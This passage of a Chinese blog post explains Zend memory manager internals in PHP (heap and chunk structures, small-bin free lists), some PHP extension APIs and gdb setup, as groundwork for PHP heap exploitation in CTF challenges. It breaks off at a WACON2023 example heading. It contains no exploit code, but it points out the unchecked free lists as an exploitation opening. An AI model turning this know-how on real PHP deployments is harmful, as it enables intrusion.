class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_MM_LARGE_BUCKET_INDEX(S) zend_mm_high_bit(S)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">zend_mm_high_bit</span><span class="params">(<span class="type">size_t</span> _size)</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">..<span class="comment">//省略若干不同环境的实现</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (_size != <span class="number">0</span>) &#123;</span><br><span class="line">        _size = _size &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个hash函数用来计算size中最高位的1的比特位是多少，这点从其函数名就可以看出。假设此时size为512Byte，则这段内存会放在large_free_buckets列表，512的二进制码为1000000000，则zend_mm_high_bit(512)计算的值为9，则其对应的列表index为9。关于右移操作，这里有一点说明</p><p>large_free_buckets列表的结构如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-06_162042.png" alt=""></p><h4 id="新"><a href="#新" class="headerlink" title="新"></a>新</h4><p>新版才是现在的主流,我们主要关注这个</p><p>新zend内存分配有三种模式</p><ul><li>small:&lt;=3KB的内存</li><li>large:3KB小于等于(2MB减去4KB)内存</li><li>huge:大于2MB减去4KB内存</li></ul><p>内存数据结构:<br>全局变量alloc_globals.mm_heap指向zend_mm_heap数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="type">int</span>                use_custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STORAGE</span></span><br><span class="line">zend_mm_storage   *storage;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             size;                    <span class="comment">/* current memory usage */</span></span><br><span class="line"><span class="type">size_t</span>             peak;                    <span class="comment">/* peak memory usage */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">zend_mm_free_slot *free_slot[ZEND_MM_BINS]; <span class="comment">/* free lists for small sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT || ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             real_size;               <span class="comment">/* current size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             real_peak;               <span class="comment">/* peak size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             limit;                   <span class="comment">/* memory limit */</span></span><br><span class="line"><span class="type">int</span>                overflow;                <span class="comment">/* memory overflow flag */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">zend_mm_huge_list *huge_list;               <span class="comment">/* list of huge allocated blocks */</span></span><br><span class="line"></span><br><span class="line">zend_mm_chunk     *main_chunk;</span><br><span class="line">zend_mm_chunk     *cached_chunks;<span class="comment">/* list of unused chunks */</span></span><br><span class="line"><span class="type">int</span>                chunks_count;<span class="comment">/* number of alocated chunks */</span></span><br><span class="line"><span class="type">int</span>                peak_chunks_count;<span class="comment">/* peak number of allocated chunks for current request */</span></span><br><span class="line"><span class="type">int</span>                cached_chunks_count;<span class="comment">/* number of cached chunks */</span></span><br><span class="line"><span class="type">double</span>             avg_chunks_count;<span class="comment">/* average number of chunks allocated per request */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span>);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">&#125; <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span> ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">&#125; debug;</span><br><span class="line">&#125; custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>chunk数据结构:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_chunk</span> &#123;</span></span><br><span class="line">zend_mm_heap      *heap;<span class="comment">//AG()里的mm_heap地址</span></span><br><span class="line">zend_mm_chunk     *next;<span class="comment">//下一个trunk</span></span><br><span class="line">zend_mm_chunk     *prev;<span class="comment">//之前的trunk</span></span><br><span class="line"><span class="type">int</span>                free_pages;<span class="comment">/* number of free pages */</span></span><br><span class="line"><span class="type">int</span>                free_tail;               <span class="comment">/* number of free pages at the end of chunk </span></span><br><span class="line"><span class="comment">    最后一块连续可用的page*/</span></span><br><span class="line"><span class="type">int</span>                num; <span class="comment">//当前chunk的序号</span></span><br><span class="line"><span class="type">char</span>               reserve[<span class="number">64</span> - (<span class="keyword">sizeof</span>(<span class="type">void</span>*) * <span class="number">3</span> + <span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">3</span>)];</span><br><span class="line">zend_mm_heap       heap_slot;               <span class="comment">/* 只用于mainchunk used only in main chunk */</span></span><br><span class="line">zend_mm_page_map   free_map;                <span class="comment">/* 空闲页的位图512 bits or 64 bytes */</span></span><br><span class="line">zend_mm_page_info  <span class="built_in">map</span>[ZEND_MM_PAGES];      <span class="comment">/* 存储每个页的使用信息,高两位代表使用内存的类型,低十位区分是否连续的页 2 KB = 512 * 4 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一个chunk管理512个页,也就是2m(4096*512)的内存,一个chunk中的页可以用于满足多种大小的分配</p><p><strong>内存分配逻辑</strong></p><p><strong>huge</strong></p><p><strong>分配</strong><br>1.申请size需要根据page_size进行对齐<br>2.对齐后的size再根据chunk_size大小进行对齐<br>3.将内存挂载到alloc_global.mm_heap-&gt;huge_list上</p><p><strong>释放:</strong> 从huge_list链表中删除,调用munmap释放.</p><p><strong>large</strong></p><p>large分配是page分配的整数倍.</p><p>1.遍历双向链表alloc_global.mm_heap-&gt;main_trunk<br>2.如果free_pages小于要申请的页的个数回到1.<br>3.根据zend_mm_chunk-&gt;free_map查找最优连续page(连续page个数最少,连续page编号最少).<br>4.如果查找可分配的页则返回对应的地址,并将map[page_num]标记为large内存<br>5.如果chunk都没有可分配内存,就新申请一个chunk,在进行分配.</p><p><strong>释放:</strong><br>将zend_mm_chunk-&gt;free_map[page_num],zend_mm_chunk-&gt;map[page_num]置为0.<br>然后修改free_pages.如果pages都释放,那么释放chunk.</p><h3 id="small分配路径"><a href="#small分配路径" class="headerlink" title="small分配路径"></a>small分配路径</h3><p><a href="https://zhuanlan.zhihu.com/p/41622782">【PHP7源码分析】PHP内存管理（上） - 知乎 (zhihu.com)</a>,这篇文章很不错</p><p><strong>small</strong>分配在php内存利用中是比较轻易的,因为其并没有足够的检查</p><p>small类型共分为<strong>30种不同的大小</strong>.规格如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//宏定义：第一列表示序号（称之为bin_num），第二列表示每个small内存的大小（字节数）；//第四列表示每次获取多少个page；第三列表示将page分割为多少个大小为第一列的small内存；#define ZEND_MM_BINS_INFO(_, x, y) \</span></span><br><span class="line"><span class="comment">    _( 0,    8,  512, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 1,   16,  256, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 2,   24,  170, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 3,   32,  128, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 4,   40,  102, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 5,   48,   85, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 6,   56,   73, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 7,   64,   64, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 8,   80,   51, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 9,   96,   42, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(10,  112,   36, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(11,  128,   32, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(12,  160,   25, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(13,  192,   21, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(14,  224,   18, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(15,  256,   16, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(16,  320,   64, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(17,  384,   32, 3, x, y) \</span></span><br><span class="line"><span class="comment">    _(18,  448,    9, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(19,  512,    8, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(20,  640,   32, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(21,  768,   16, 3, x, y) \</span></span><br><span class="line"><span class="comment">    _(22,  896,    9, 2, x, y) \</span></span><br><span class="line"><span class="comment">    _(23, 1024,    8, 2, x, y) \</span></span><br><span class="line"><span class="comment">    _(24, 1280,   16, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(25, 1536,    8, 3, x, y) \</span></span><br><span class="line"><span class="comment">    _(26, 1792,   16, 7, x, y) \</span></span><br><span class="line"><span class="comment">    _(27, 2048,    8, 4, x, y) \</span></span><br><span class="line"><span class="comment">    _(28, 2560,    8, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(29, 3072,    4, 3, x, y)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ZEND_ALLOC_SIZES_H */</span></span></span><br></pre></td></tr></table></figure><p>zendmm中chunk的含义和ptmalloc2中不太相同,我这里将<u>管理同一大小</u>的一个或多个页称为small_frame</p><p><u>一个small_frame上所有空闲的块全都被链在一个单链表上</u>,采用<u>lifo</u>的方式管理,链表头由mm_heap-&gt;free_slot数组维护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_never_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small_slow</span><span class="params">(zend_mm_heap *heap, <span class="type">uint32_t</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);</span><br><span class="line">page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num] = ZEND_MM_SRUN(bin_num);</span><br><span class="line"><span class="keyword">if</span> (bin_pages[bin_num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num+i] = ZEND_MM_NRUN(bin_num, i);</span><br><span class="line">i++;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt; bin_pages[bin_num]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a linked list of elements from 1 to last */</span></span><br><span class="line">end = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - <span class="number">1</span>)));</span><br><span class="line">heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + bin_data_size[bin_num]);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">p-&gt;next_free_slot = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">p = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line">&#125; <span class="keyword">while</span> (p != end);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数主要用于分配small_frame时构建small链。它解释了 30 条单链是如何构建的。</p><p>因为链的每个部分不必包含有关其大小的标头，只留下 next字段,组织形式有点像glibc的fastbin或tcachebin,甚至更危险因为其甚至没有块头,这显然是极其危险的</p><p>与ptmalloc2不同,其没有一个top_chunk管理所有尚未使用区域,而是像slab分配器那样,所有空闲的块全部组织在链上,但不同的是,zendmm没有slab那么多的保护机制</p><p><strong>alloc</strong>时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small</span><span class="params">(zend_mm_heap *heap, <span class="type">int</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">size_t</span> size = heap-&gt;size + bin_data_size[bin_num];</span><br><span class="line"><span class="type">size_t</span> peak = MAX(heap-&gt;peak, size);</span><br><span class="line">heap-&gt;size = size;</span><br><span class="line">heap-&gt;peak = peak;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EXPECTED(heap-&gt;free_slot[bin_num] != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>根据申请的内存查找对应的规格表</p></li><li><p>根据规格表中的num,如果mm_heap-&gt;free_slot[num]为空则继续下一步,如果不为空返回对应的地址,并从mm_heap-&gt;free_slot[num]指向链表的首地址删除</p></li><li><p>申请的规格表中对应的页数(bin_pages[bin_num])并更新mm_chunk-&gt;map[page_num]<u>标识位为small内存</u>.</p><p>第一个页需要设置mappage_num(位于map的24bit-16bit位段)设置free_slot个数.接下的连续页的标志位给予顺序标志(位于map的24bit-16bit位段).</p></li></ol><p><strong>释放时:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> <span class="title function_">zend_mm_free_small</span><span class="params">(zend_mm_heap *heap, <span class="type">void</span> *ptr, <span class="type">int</span> bin_num)</span></span><br><span class="line">&#123;</span><br><span class="line">zend_mm_free_slot *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">heap-&gt;size -= bin_data_size[bin_num];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">p = (zend_mm_free_slot*)ptr;</span><br><span class="line">p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接插入mm_heap-&gt;free_slot当中.</p><h2 id="常用接口函数"><a href="#常用接口函数" class="headerlink" title="常用接口函数"></a>常用接口函数</h2><h3 id="zend-parse-paramenters"><a href="#zend-parse-paramenters" class="headerlink" title="zend_parse_paramenters"></a>zend_parse_paramenters</h3><p>函数原型</p><p><code>int zend_parse_parameters(int num_args, const char *type_spec, ...);</code></p><p><code>zend_parse_parameters</code> 解析参数，第一个参数是传递的参数个数。通常使用 <code>ZEND_NUM_ARGS()</code> 来获取。 </p><p>第二个参数是一个字符串，指定了函数期望的各个参数的类型，后面紧跟着需要随参数值更新的变量列表。 因为PHP采用松散的变量定义和动态的类型判断，这样做就使得把不同类型的参数转化为期望的类型成为可能。</p><div class="table-container"><table><thead><tr><th>参数</th><th>代表着的类型</th></tr></thead><tbody><tr><td>b</td><td>Boolean</td></tr><tr><td>l</td><td>Integer</td></tr><tr><td>d</td><td>Float</td></tr><tr><td>s</td><td>String</td></tr><tr><td>r</td><td>Resource</td></tr><tr><td>a</td><td>Array</td></tr><tr><td>o</td><td>Object</td></tr><tr><td>O</td><td>特定类型的Object</td></tr><tr><td>z</td><td>任意类型</td></tr><tr><td>Z</td><td>zval**类型</td></tr><tr><td>f</td><td>表示函数、方法名称</td></tr></tbody></table></div><p>举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;sl&quot;</span>, &amp;str, &amp;str_len, &amp;n)</span><br></pre></td></tr></table></figure><p>该表达式则是获取两个参数 <code>str</code> 和 <code>n</code>，字符串的类型是<code>s</code>，需要两个参数 <code>char *</code> 字符串和 <code>int</code> 长度；数字的类型 <code>l</code> ，只需要一个参数。</p><h3 id="string相关"><a href="#string相关" class="headerlink" title="string相关"></a>string相关</h3><h4 id="str-pad"><a href="#str-pad" class="headerlink" title="str_pad"></a>str_pad</h4><p>填充字符串到指定长度</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">str_pad</span>(<span class="keyword">string</span> <span class="variable">$input</span>, <span class="keyword">int</span> <span class="variable">$pad_length</span>, <span class="keyword">string</span> <span class="variable">$pad_string</span> = <span class="string">&quot; &quot;</span>, <span class="keyword">int</span> <span class="variable">$pad_type</span> = STR_PAD_RIGHT): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>$input</code>：要填充的字符串。</li><li><code>$pad_length</code>：填充后的字符串长度。</li><li><code>$pad_string</code>：可选，用于填充的字符，默认为空格。</li><li><code>$pad_type</code>：可选，填充类型，默认为 <code>STR_PAD_RIGHT</code>，还可以是 <code>STR_PAD_LEFT</code> 或 <code>STR_PAD_BOTH</code>。</li></ul><h4 id="str-repeat"><a href="#str-repeat" class="headerlink" title="str_repeat"></a>str_repeat</h4><p><code>str_repeat()</code> 是 PHP 中的一个内置函数，用于重复一个字符串若干次。</p><p>它的语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">str_repeat</span> ( <span class="keyword">string</span> <span class="variable">$input</span> , <span class="keyword">int</span> <span class="variable">$multiplier</span> )</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>$input</code>：要重复的字符串。</li><li><code>$multiplier</code>：重复的次数，必须是一个整数</li></ul><h3 id="输出缓冲区"><a href="#输出缓冲区" class="headerlink" title="输出缓冲区"></a>输出缓冲区</h3><h4 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h4><p><code>ob_start()</code> 是 PHP 中的一个内置函数，用于启动输出缓冲。当启用输出缓冲后，所有后续的输出不会直接发送到客户端，而是存储在内存中的缓冲区中，直到缓冲区被刷新或关闭。</p><p><code>ob_start()</code> 函数的语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">ob_start</span> ([ <span class="keyword">callable</span> <span class="variable">$output_callback</span> = <span class="literal">NULL</span> [, <span class="keyword">int</span> <span class="variable">$chunk_size</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = PHP_OUTPUT_HANDLER_STDFLAGS ]]] )</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>$output_callback</code>：可选参数，指定一个回调函数，用于处理输出缓冲中的内容。当指定了此参数时，缓冲区中的内容会被传递给该回调函数进行处理。</li><li><code>$chunk_size</code>：可选参数，指定每次写入缓冲区的字节数，默认为 0，表示不限制字节数。</li><li><code>$flags</code>：可选参数，用于设置输出处理的标志，通常使用默认值 <code>PHP_OUTPUT_HANDLER_STDFLAGS</code>。</li></ul><h4 id="ob-get-content"><a href="#ob-get-content" class="headerlink" title="ob_get_content()"></a>ob_get_content()</h4><p><code>ob_get_contents()</code> 是 PHP 中的一个内置函数，用于获取当前输出缓冲区的内容，并返回缓冲区的内容作为字符串。</p><p>它的语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>|<span class="literal">false</span> <span class="title function_ invoke__">ob_get_contents</span> ([ <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">string</span> <span class="variable">$chunk_size</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$length</span> ]]] )</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>$flags</code>：可选参数，用于指定获取缓冲区内容的选项，默认为0。</li><li><code>$chunk_size</code>：可选参数，用于指定每次读取缓冲区的字节数，默认为-1，表示读取全部内容。</li><li><code>$length</code>：可选参数，如果指定了该参数并且 <code>$flags</code> 设置为 <code>PHP_OUTPUT_HANDLER_FLUSHABLE</code>，则该参数将用于返回读取的字节数。</li></ul><h4 id="ob-end-flush"><a href="#ob-end-flush" class="headerlink" title="ob_end_flush"></a>ob_end_flush</h4><p><code>ob_end_flush()</code> 是 PHP 中的一个内置函数，用于结束当前的输出缓冲并将缓冲区的内容输出到浏览器。同时，它也会关闭当前的输出缓冲区，使之后的输出直接发送到客户端而不经过缓冲。</p><p>它的语法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ob_end_flush</span> <span class="params">( <span class="type">void</span> )</span></span><br></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><code>gdb php</code></p><p>先<code>set args -c php.ini</code>空跑一遍,加载so拓展,然后下断点</p><p>再<code>set args -c php.ini exp.php</code>然后即可进行调试</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="WACON2023-heaphp"><a href="#WACON2023-heaphp" class="headerlink" title="WACON2023-heaphp"></a>WACON2023-heaphp</h2><p><a href="https://deepunk.icu/php-pwn/">PHP 堆利用简介 —- A Brief Introduction to PHP Heap Exploitation 